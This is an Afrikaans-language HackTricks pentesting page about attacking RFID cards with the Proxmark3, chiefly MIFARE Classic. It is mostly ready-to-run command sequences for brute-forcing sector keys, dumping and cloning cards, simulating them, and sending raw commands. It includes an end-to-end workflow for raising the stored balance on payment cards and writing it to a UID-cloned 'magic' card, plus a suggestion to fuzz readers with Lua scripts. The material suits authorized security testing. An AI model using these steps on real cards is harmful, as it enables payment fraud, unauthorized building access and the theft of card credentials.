# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Aanvalle teen RFID-stelsels met Proxmark3

Installeer die aktief onderhoude RRG/Iceman Proxmark3-client en ooreenstemmende firmware, en bevestig dan die command-sintaks met daardie build, omdat ouer commands wat hieronder gewys word, moontlik verander het.<sup>[[1]](#references)[[5]](#references)</sup>

### Aanvalle teen MIFARE Classic 1KB

MIFARE Classic 1K het **16 sektore**, elk met **4 blokke** van **16 grepe**. Manufacturer block 0 bevat die UID/manufacturer-data en is leesalleen op egte NXP-kaarte; spesiale clone- of “magic”-kaarte kan dit moontlik maak om dit te herskryf.<sup>[[1]](#references)[[2]](#references)</sup>\
Om toegang tot elke sektor te verkry, benodig jy **2 sleutels** (**A** en **B**) wat in **block 3 van elke sektor** (sector trailer) gestoor word. Die sector trailer stoor ook die **access bits** wat die **lees- en skryftoestemmings** op **elke blok** bepaal deur die 2 sleutels te gebruik.\
2 sleutels is nuttig om toestemming te gee om te lees as jy die eerste een ken, en om te skryf as jy die tweede een ken (byvoorbeeld).

Verskeie aanvalle kan uitgevoer word
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Die Proxmark3 laat jou toe om ander aksies uit te voer, soos om **Tag to Reader communication** af te luister om sensitiewe data te probeer vind. Met hierdie kaart kon jy die kommunikasie eenvoudig sniff en die gebruikte sleutel bereken, omdat die **cryptographic operations used are weak** en jy dit kan bereken deur die plain en cipher text te ken (`mfkey64`-tool).<sup>[[3]](#references)</sup>

#### MiFare Classic vinnige workflow vir misbruik van gestoorde waarde

Wanneer terminale saldo's op Classic-kaarte stoor, is 'n tipiese end-tot-end-vloei soos volg:<sup>[[4]](#references)</sup>
```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```
Notas

- `hf mf autopwn` orchestrates nested/darkside/HardNested-style attacks, recovers keys, and creates dumps in the client dumps folder.<sup>[[1]](#references)</sup>
- Writing block 0/UID only works on magic gen1a/gen2 cards. Normal Classic cards have read-only UID.<sup>[[2]](#references)</sup>
- Many deployments use Classic "value blocks" or simple checksums. Ensure all duplicated/complemented fields and checksums are consistent after editing.<sup>[[4]](#references)</sup>

Sien ’n hoërvlak-metodologie en versagtingsmaatreëls in:

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Rou opdragte

IoT-stelsels gebruik soms **ongemerkte of niekommersiële tags**. In hierdie geval kan jy Proxmark3 gebruik om pasgemaakte **rou opdragte na die tags** te stuur.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quitting Search
```
Met hierdie inligting kan jy probeer om inligting oor die kaart en oor die manier waarop daarmee gekommunikeer word, te soek. Proxmark3 laat jou toe om rou opdragte soos die volgende te stuur: `hf 14a raw -p -b 7 26`

### Skripte

Die Proxmark3-sagteware bevat ’n voorafgelaaide lys van **outomatiseringskripte** wat jy kan gebruik om eenvoudige take uit te voer. Gebruik die `script list`-opdrag om die volledige lys te kry. Gebruik vervolgens die `script run`-opdrag, gevolg deur die naam van die skrip:
```
proxmark3> script run mfkeys
```
Jy kan 'n script skep om **tag readers** te **fuzz**; om die data van 'n **geldige kaart** te kopieer, skryf net 'n **Lua script** wat een of meer ewekansige **bytes** **randomize** en kyk of die **reader crashes** met enige iterasie.

## References

- [1] [Proxmark3-wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Proxmark3-wiki: HF Magic-kaarte](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [NXP se verklaring oor MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [Ontginning van NFC-kaartkwesbaarheid in KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
- [5] [RRG/Iceman Proxmark3 — Linux-installasie](https://github.com/RfidResearchGroup/proxmark3/blob/master/doc/md/Installation_Instructions/Linux-Installation-Instructions.md)
{{#include ../../banners/hacktricks-training.md}}
